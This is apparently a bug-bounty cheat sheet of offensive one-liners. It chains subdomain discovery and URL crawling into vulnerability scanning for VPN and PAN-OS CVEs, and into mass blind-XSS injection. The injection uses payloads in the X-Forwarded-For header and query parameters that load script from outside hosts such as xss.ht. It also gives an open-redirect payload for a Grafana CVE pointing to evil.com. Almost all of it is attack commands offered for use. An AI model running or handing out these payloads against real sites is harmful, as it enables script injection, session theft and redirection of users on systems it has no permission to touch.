## Juicy Vulnerabilities in a Minutes
```
subdominator -d example[.]com | httpx -silent | grep -i vpn | nuclei -tags panos,vpn | grep -i cve
```
## Blind XSS via X-Forwarded-For Header
```
subfinder -d test.com | gau | bxss -payload '"><script src=https://rahul.bxss.in></script>' -header "X-Forwarded-For"
```
Parameter-Based Approach
```
subfinder target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
```
## Open Redirect in Grafana (CVE-2025-4123)
Payload:
```
/public/..%2F%5Cevil.com%2F%3F%2F..%2F..
```
 How to Use:
- Target Login Page: https://target.com/login
- Payload Usage (Test for Open Redirect): https://target.com/public/..%2F%5Cevil.com%2F%3F%2F..%2F..
